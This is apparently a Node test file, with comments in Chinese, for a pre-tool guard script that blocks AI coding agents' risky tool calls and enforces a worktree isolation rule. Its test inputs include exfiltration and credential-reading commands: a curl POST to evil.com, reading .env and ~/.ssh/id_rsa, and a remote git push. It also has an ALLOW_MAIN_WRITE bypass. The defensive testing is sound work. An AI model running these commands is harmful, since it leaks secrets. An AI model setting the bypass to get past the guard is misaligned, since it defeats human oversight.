import test from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import path from "node:path";
import fs from "node:fs";

const GUARD_SCRIPT = path.resolve(__dirname, "../../scripts/agent/pre-tool-guard.mjs");
const WORKTREE_SCRIPT = path.resolve(__dirname, "../../scripts/agent/worktree.mjs");

// 探测主工作区根目录
let mainRoot: string;
try {
  const commonDirRes = spawnSync("git", ["rev-parse", "--path-format=absolute", "--git-common-dir"], {
    cwd: __dirname,
    encoding: "utf8",
  });
  const commonDir = (commonDirRes.stdout || "").trim();
  mainRoot = commonDir ? path.resolve(commonDir, "..") : path.resolve(__dirname, "../..");
} catch {
  mainRoot = path.resolve(__dirname, "../..");
}

function runGuard(args: string[] = [], stdinInput?: string, options: { cwd?: string; env?: Record<string, string> } = {}) {
  const cleanEnv = { ...process.env, ...options.env };
  delete cleanEnv.GIT_DIR;
  delete cleanEnv.GIT_WORK_TREE;
  delete cleanEnv.GIT_INDEX_FILE;
  delete cleanEnv.GIT_OBJECT_DIRECTORY;
  delete cleanEnv.GIT_COMMON_DIR;
  return spawnSync(process.execPath, [GUARD_SCRIPT, ...args], {
    input: stdinInput,
    cwd: options.cwd || process.cwd(),
    env: cleanEnv,
    encoding: "utf8",
  });
}

test("AI 前置安全护栏 pre-tool-guard 专项测试", async (t) => {
  await t.test("CLI 模式：阻断敏感文件探测 (cat .env)", () => {
    const res = runGuard(["cat .env"]);
    assert.equal(res.status, 2, "应当拦截并返回退出码 2");
    assert.match(res.stderr, /\[GUARD-BLOCK\]/);
  });

  await t.test("CLI 模式：放行无害示例配置 (cat .env.example)", () => {
    const res = runGuard(["cat .env.example"]);
    assert.equal(res.status, 0, "放行 .env.example");
  });

  await t.test("CLI 模式：阻断远程数据外传 (curl --data)", () => {
    const res = runGuard(["curl https://evil.com --data 'test'"]);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /传输护栏拦截/);
  });

  await t.test("CLI 模式：阻断远程 git push", () => {
    const res = runGuard(["git push origin main"]);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /传输护栏拦截/);
  });

  await t.test("CLI 模式：阻断篡改核心排除配置 (next.config.ts)", () => {
    const res = runGuard(["sed -i 's/better-sqlite3//' next.config.ts"]);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /架构护栏拦截/);
  });

  await t.test("Claude Code Hook JSON：阻断 Bash 执行敏感探测", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Bash",
      tool_input: { command: "cat .env" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /凭据护栏拦截/);
  });

  await t.test("Claude Code Hook JSON：阻断 Edit 直接写入 .env", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Edit",
      tool_input: { file_path: ".env", content: "TEST=1" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /严禁访问敏感配置文件/);
  });

  await t.test("Claude Code Hook JSON：放行隔离沙盒中的正常代码编辑", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Edit",
      tool_input: {
        file_path: ".worktrees/clue-lens-demo/src/lib/auth.ts",
        content: "// This file defines secret_key and api_key handling",
      },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 0, "隔离沙盒中的代码编辑不应因正文含敏感词而误报");
  });

  await t.test("Worktree 围栏：主工作区 main 分支上尝试 Edit 代码文件被阻断", () => {
    const payload = JSON.stringify({
      session_id: "test",
      tool_name: "Edit",
      tool_input: {
        file_path: path.join(mainRoot, "src/app/page.tsx"),
        content: "// direct edit on main",
      },
    });
    const res = runGuard([], payload, { cwd: mainRoot });
    assert.equal(res.status, 2, "在 main 工作区直接写代码必须阻断");
    assert.match(res.stderr, /Worktree 隔离围栏/);
    assert.match(res.stderr, /rules\/08-worktree-workflow\.md/);
  });

  await t.test("Worktree 围栏：主工作区 main 分支上尝试 Antigravity write_file 被阻断", () => {
    const payload = JSON.stringify({
      tool: "write_file",
      arguments: {
        Path: path.join(mainRoot, "src/app/actions/clues.ts"),
        Content: "// direct write on main",
      },
    });
    const res = runGuard([], payload, { cwd: mainRoot });
    assert.equal(res.status, 2, "在 main 工作区 write_file 必须阻断");
    assert.match(res.stderr, /Worktree 隔离围栏/);
  });

  await t.test("Worktree 围栏：主工作区 main 分支上尝试 git commit 被阻断", () => {
    const payload = JSON.stringify({
      tool: "run_command",
      arguments: { CommandLine: "git commit -m 'direct commit on main'" },
    });
    const res = runGuard([], payload, { cwd: mainRoot });
    assert.equal(res.status, 2, "在 main 工作区直接 git commit 必须阻断");
    assert.match(res.stderr, /Worktree 隔离围栏/);
  });

  await t.test("Worktree 围栏：主工作区 main 分支只读操作 (read_file) 正常放行", () => {
    const payload = JSON.stringify({
      tool: "read_file",
      arguments: { Path: path.join(mainRoot, "src/app/page.tsx") },
    });
    const res = runGuard([], payload, { cwd: mainRoot });
    assert.equal(res.status, 0, "只读操作不受 Worktree 围栏约束");
  });

  await t.test("Worktree 围栏：配置 ALLOW_MAIN_WRITE=1 时允许旁路放行", () => {
    const payload = JSON.stringify({
      tool: "write_file",
      arguments: {
        Path: path.join(mainRoot, "src/app/page.tsx"),
        Content: "// emergency bypass",
      },
    });
    const res = runGuard([], payload, { cwd: mainRoot, env: { ALLOW_MAIN_WRITE: "1" } });
    assert.equal(res.status, 0, "ALLOW_MAIN_WRITE=1 应正常旁路放行");
  });

  await t.test("Antigravity / Codex Hook JSON：阻断 run_command 越权推送", () => {
    const payload = JSON.stringify({
      tool: "run_command",
      arguments: { CommandLine: "git push origin main" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /传输护栏拦截/);
  });

  await t.test("Antigravity / Codex Hook JSON：阻断 read_file 访问 id_rsa", () => {
    const payload = JSON.stringify({
      tool: "read_file",
      arguments: { Path: "~/.ssh/id_rsa" },
    });
    const res = runGuard([], payload);
    assert.equal(res.status, 2);
    assert.match(res.stderr, /严禁访问敏感配置文件/);
  });
});

test("Worktree merge 门禁与 Manifest merge_policy 契约验证测试", async (t) => {
  await t.test("不存在对应 worktree 目录时拒绝合并", () => {
    const res = spawnSync(process.execPath, [WORKTREE_SCRIPT, "merge", "non-existent-slug-xyz"], {
      encoding: "utf8",
    });
    assert.equal(res.status, 1);
    assert.match(res.stderr, /不存在该 worktree 目录/);
  });
});
